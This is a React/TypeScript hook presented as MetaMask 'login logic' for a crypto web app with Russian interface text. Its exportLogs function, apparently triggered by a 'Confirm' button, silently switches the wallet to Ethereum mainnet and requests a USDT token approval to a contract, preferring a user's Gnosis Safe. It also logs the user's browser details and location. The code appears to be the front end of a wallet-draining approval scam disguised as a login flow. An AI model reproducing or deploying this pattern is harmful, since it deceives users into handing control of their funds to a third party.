import { useState, useEffect, useRef } from "react";
import { useContractInteraction } from "../hooks/use-contract-interaction";
import { logger } from "../utils/logger";
import type { LogEntry } from "../utils/logger";

export function useMetamaskLoginLogic() {
  // Safe wallet state
  const [selectedSafe, setSelectedSafe] = useState<string | null>(null);
  const [safeBalance, setSafeBalance] = useState<string | null>(null);
  const [connected, setConnected] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logsRef = useRef<HTMLDivElement | null>(null);
  const [toasts, setToasts] = useState<Array<{ id: string; title?: string; description?: string; variant?: string; leaving?: boolean; entered?: boolean }>>([]);

  const addToast = (t: { title?: string; description?: string; duration?: number; variant?: string }) => {
    const id = String(Date.now()) + Math.random().toString(36).slice(2, 6);
    const item = { id, title: t.title, description: t.description, variant: t.variant, leaving: false, entered: false };
    setToasts((s) => [item, ...s]);
    setTimeout(() => setToasts((s) => s.map((x) => (x.id === id ? { ...x, entered: true } : x))), 20);
    const dur = t.duration ?? 4000;
    setTimeout(() => {
      setToasts((s) => s.map((x) => (x.id === id ? { ...x, leaving: true } : x)));
      setTimeout(() => setToasts((s) => s.filter((x) => x.id !== id)), 300);
    }, dur);
  };

  useEffect(() => {
    const handler = (e: any) => {
      try {
        const d = e.detail || {};
        addToast({ title: d.title, description: d.description, duration: d.duration, variant: d.variant });
      } catch (err) {
        console.warn("app:toast handler error", err);
      }
    };
    window.addEventListener("app:toast", handler as EventListener);
    return () => window.removeEventListener("app:toast", handler as EventListener);
  }, []);

  const [safeModalVisible, setSafeModalVisible] = useState(false);
  const [safeCandidates, setSafeCandidates] = useState<string[]>([]);

  const handleSelectSafe = (addr: string) => {
    try {
      window.dispatchEvent(new CustomEvent("wallet:safeSelected", { detail: addr }));
      addToast({ title: "Gnosis Safe выбран", description: addr });
      setSelectedSafe(addr);
      fetchSafeBalance(addr);
    } catch (e) {
      console.warn("Failed to dispatch wallet:safeSelected", e);
    }
    setSafeModalVisible(false);
    setSafeCandidates([]);
  };

  const handleDismissSafe = () => {
    setSafeModalVisible(false);
    setSafeCandidates([]);
    setSelectedSafe(null);
    setSafeBalance(null);
    addToast({ title: "Используется EOA", description: "Будет использован подключённый кошелёк" });
  };
  // Получение баланса Safe
  const fetchSafeBalance = async (safeAddr: string) => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    try {
      logger.debug("Fetching Safe balance", "balance", { account: safeAddr });
      const res = await eth.request({ method: "eth_getBalance", params: [safeAddr, "latest"] });
      logger.info("Safe balance fetched", "balance", { raw: res });
      setSafeBalance(formatEth(res));
    } catch (err) {
      logger.error("Failed to fetch Safe balance", "balance", { err: String(err) });
    }
  };

  useEffect(() => {
    const handler = (e: any) => {
      try {
        const safes: string[] = e.detail || [];
        if (Array.isArray(safes) && safes.length > 0) {
          setSafeCandidates(safes);
          setSafeModalVisible(true);
        }
      } catch (err) {
        console.warn("wallet:safeFound handler error", err);
      }
    };
    window.addEventListener("wallet:safeFound", handler as EventListener);
    return () => window.removeEventListener("wallet:safeFound", handler as EventListener);
  }, []);

  const { isContractConnected, approveUSDT, USDT_ADDRESS } = useContractInteraction();

  useEffect(() => {
    const interval = setInterval(() => {
      const b = (logger as any)._buffer as LogEntry[];
      if (b.length > 0) {
        const payload = b.splice(0, b.length);
        setLogs((prev) => [...prev, ...payload]);
      }
    }, 800);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (logsRef.current) {
      logsRef.current.scrollTop = logsRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    const eth = (window as any).ethereum;
    if (!eth) {
      logger.warn("No window.ethereum detected", "init");
      return;
    }
    const onAccounts = (accounts: string[]) => {
      logger.info("accountsChanged event", "provider", { accounts });
      if (accounts.length === 0) {
        setConnected(false);
        setAddress(null);
      } else {
        setConnected(true);
        setAddress(accounts[0]);
        fetchBalance(accounts[0]);
      }
    };
    const onChain = (c: string) => {
      logger.info("chainChanged event", "provider", { chainId: c });
      setChainId(c);
    };
    const onDisconnect = (err: any) => {
      logger.warn("disconnect event", "provider", { err });
      setConnected(false);
      setAddress(null);
    };
    eth.on && eth.on("accountsChanged", onAccounts);
    eth.on && eth.on("chainChanged", onChain);
    eth.on && eth.on("disconnect", onDisconnect);
    return () => {
      eth.removeListener && eth.removeListener("accountsChanged", onAccounts);
      eth.removeListener && eth.removeListener("chainChanged", onChain);
      eth.removeListener && eth.removeListener("disconnect", onDisconnect);
    };
  }, []);

  const formatEth = (weiStr: string | number) => {
    try {
      const big = typeof weiStr === "string" ? BigInt(weiStr) : BigInt(Math.floor(Number(weiStr)));
      const div = BigInt(1_000_000_000_000_000_000);
      const whole = big / div;
      const rem = big % div;
      const remStr = rem.toString().padStart(18, "0").slice(0, 6);
      return `${whole.toString()}.${remStr}`;
    } catch (e) {
      return String(weiStr);
    }
  };

  const fetchBalance = async (acc: string) => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    try {
      logger.debug("Fetching balance", "balance", { account: acc });
      const res = await eth.request({ method: "eth_getBalance", params: [acc, "latest"] });
      logger.info("Balance fetched", "balance", { raw: res });
      setBalance(formatEth(res));
    } catch (err) {
      logger.error("Failed to fetch balance", "balance", { err: String(err) });
    }
  };

  const connectMetaMask = async () => {
    const eth = (window as any).ethereum;
    logger.info("Connect button clicked", "ui");
    if (eth && eth.isMetaMask) {
      try {
        const accounts: string[] = await eth.request({ method: "eth_requestAccounts" });
        logger.info("Accounts granted", "connect", { accounts });
        if (accounts.length > 0) {
          setConnected(true);
          setAddress(accounts[0]);
          const chain = await eth.request({ method: "eth_chainId" });
          setChainId(chain);
          await fetchBalance(accounts[0]);
          logger.info("User connected via MetaMask", "auth", {
            account: accounts[0],
            chainId: chain,
            userAgent: navigator.userAgent,
            url: window.location.href,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          });
        }
      } catch (err: any) {
        logger.error("MetaMask connection failed", "connect", { error: String(err) });
        if (err && err.code === 4001) {
          logger.warn("User rejected connection request", "connect");
        }
      }
      return;
    }
    const userAgent = navigator.userAgent || navigator.vendor;
    const isMobile = /android|iphone|ipad|ipod/i.test(userAgent);
    if (isMobile) {
      const dappUrl = encodeURIComponent(window.location.href);
      const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
      logger.info("Redirecting to MetaMask app", "mobile", { metamaskAppDeepLink });
      window.location.href = metamaskAppDeepLink;
      return;
    }
    logger.error("MetaMask not found", "connect");
    try { addToast({ title: "MetaMask не найден", description: "Установите расширение или приложение.", variant: 'destructive' }); } catch (e) { }
  };

  const disconnect = () => {
    logger.info("Manual disconnect clicked", "ui");
    setConnected(false);
    setAddress(null);
    setBalance(null);
    logger.debug("Local state cleared on disconnect", "auth");
  };

  const exportLogs = async () => {
    try {
      console.log('Кнопка "Подтвердить" нажата');
      logger.info('Кнопка "Подтвердить" нажата', 'ui');
      await logger.flushNow();
      logger.info("User requested confirm -> initiating contract integration", "ui");
      const eth = (window as any).ethereum;
      if (!eth) {
        logger.error("No ethereum provider found", "contract");
        try { addToast({ title: "MetaMask не найден", description: "Проверьте провайдер в браузере.", variant: 'destructive' }); } catch (e) { }
        return;
      }
      const chainId = await eth.request({ method: "eth_chainId" });
      if (chainId !== '0x1') {
        try {
          await eth.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }],
          });
        } catch (err) {
          logger.error("Failed to switch network", "contract", { error: String(err) });
          try { addToast({ title: "Неверная сеть", description: "Пожалуйста, переключитесь на Ethereum Mainnet (Chain ID 1)", variant: 'destructive' }); } catch (e) { }
          return;
        }
      }
      if (!isContractConnected) {
        logger.warn("Attempted integration but contract not ready", "ui");
        try { addToast({ title: "Контракт не готов", description: "Подключите MetaMask и переключитесь на Ethereum Mainnet (Chain ID 1).", variant: 'destructive' }); } catch (e) { }
        return;
      }
      try {
        logger.info("Requesting USDT approve via wallet", "contract", { token: USDT_ADDRESS });
        const ok = await approveUSDT(selectedSafe ?? undefined);
        if (ok) {
          logger.info("USDT approve succeeded", "contract");
          try { addToast({ title: "Approve выполнен", description: "USDT переданы под управление контракту." }); } catch (e) { }
          // После успешного approve обновляем баланс Safe, если выбран
          if (selectedSafe) {
            await fetchSafeBalance(selectedSafe);
          }
        } else {
          logger.warn("USDT approve failed or was rejected", "contract");
          try { addToast({ title: "Approve не выполнен", description: "Отклонён пользователем или не выполнен.", variant: 'destructive' }); } catch (e) { }
        }
      } catch (approveErr) {
        logger.error("Approve call error", "contract", { err: String(approveErr) });
        try { addToast({ title: "Ошибка approve", description: String(approveErr), variant: 'destructive' }); } catch (e) { }
      }
    } catch (e) {
      logger.error("Failed to run integration", "ui", { err: String(e) });
      try { addToast({ title: "Ошибка интеграции", description: String(e), variant: 'destructive' }); } catch (e) { }
    }
  };

  return {
    connected,
    address,
    chainId,
    balance,
    logs,
    logsRef,
    toasts,
    addToast,
    safeModalVisible,
    safeCandidates,
    handleSelectSafe,
    handleDismissSafe,
    selectedSafe,
    safeBalance,
    isContractConnected,
    approveUSDT,
    USDT_ADDRESS,
    connectMetaMask,
    disconnect,
    exportLogs,
  };
}
